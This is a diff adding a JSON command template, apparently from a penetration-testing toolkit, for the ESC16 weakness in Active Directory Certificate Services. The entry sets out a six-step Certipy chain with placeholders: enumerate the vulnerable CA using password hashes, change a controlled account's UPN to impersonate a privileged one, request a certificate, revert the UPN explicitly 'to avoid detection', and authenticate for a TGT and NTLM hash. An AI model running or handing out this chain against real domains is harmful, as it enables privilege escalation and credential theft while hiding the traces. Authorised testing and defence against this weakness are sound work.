@@ -1,0 +1,12 @@
+{
+  "commands": [
+{
+  "title": "ESC16",
+  "description": "ESC16: Security Extension Disabled on CA (Weak Certificate Mapping)",
+  "template": "1) Enumerate AD CS and check if ESC16 is present\n\ncertipy find -u {service_user}@{domain} -hashes {hash} -vulnerable -stdout\n\n2) Read target service account attributes (check UPN)\n\ncertipy account -u {reader_user}@{domain} -hashes {reader_hash} -user {target_user} read\n\n3) Update UPN of controlled user to impersonate privileged account\n\ncertipy account -u {modifier_user}@{domain} -hashes {modifier_hash} -user {target_user} -upn {target_impersonate} update\n\n4) Request a certificate as the impersonated account\n\ncertipy req -u {target_user} -hashes {target_hash} -dc-ip {dc_ip} -target {dc_host} -ca {ca_name} -template User\n\n5) Revert UPN change to original to avoid detection\n\ncertipy account -u {modifier_user}@{domain} -hashes {modifier_hash} -user {target_user} -upn {original_upn} update\n\n6) Authenticate using obtained certificate to get TGT/NTLM\n\ncertipy auth -dc-ip {dc_ip} -pfx {pfx_file} -u {target_impersonate} -domain {domain}"
+}
+
+  ]
+}
+
+
